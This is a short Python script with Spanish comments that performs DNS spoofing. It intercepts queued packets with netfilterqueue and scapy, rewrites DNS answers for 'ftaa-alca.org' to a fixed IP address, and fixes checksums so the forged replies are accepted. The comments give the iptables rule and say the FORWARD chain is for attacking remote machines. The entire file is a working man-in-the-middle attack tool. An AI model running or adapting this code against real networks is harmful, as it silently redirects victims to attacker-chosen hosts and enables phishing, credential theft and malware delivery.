#Se deben listar las tablas IP como super usuario de la siguiente manera
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#Forward se utiliza para atacar maquinas remotas
#para trabajar de forma local se usa OUTPUT e INPUT
#apt-get install build-essential python-dev libnetfilter-queue-dev
#pip3 install -U git+https://github.com/kti/python-netfilterqueue
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "ftaa-alca.org" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata='3.21.206.216')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()